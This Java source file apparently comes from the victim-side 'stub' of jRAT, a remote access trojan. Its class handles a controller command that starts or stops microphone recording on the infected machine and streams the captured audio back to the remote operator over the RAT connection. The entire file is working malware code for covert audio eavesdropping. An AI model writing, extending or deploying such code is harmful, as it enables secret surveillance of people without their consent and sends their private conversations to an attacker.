package se.jrat.stub.packets.incoming;

import se.jrat.common.SoundWriter;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet58ClientUploadSoundCapture;

public class Packet84ToggleSoundCapture extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean start = Connection.instance.readBoolean();
		int quality = Connection.instance.readInt();
		
		if (start) {
			new Thread(new SoundWriter(quality) {
				@Override
				public void onRead(byte[] data, int read) throws Exception {
					Connection.instance.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read, quality));	
				}
			}).start();
		} else {
			SoundWriter.instance.stop();
		}
	}

}
